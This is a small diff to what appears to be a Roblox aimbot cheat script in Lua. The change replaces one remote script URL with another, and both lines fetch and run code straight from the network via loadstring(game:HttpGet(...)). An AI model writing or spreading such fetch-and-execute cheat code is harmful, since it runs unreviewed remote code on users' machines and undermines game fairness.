@@ -29,7 +29,7 @@ end
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
-loadstring(game:HttpGet("https://dpaste.com/E4BUZZV77.txt", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pandaB397/EclipseX/refs/heads/main/Aimbor"))()
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 if not getgenv().Aimbot then
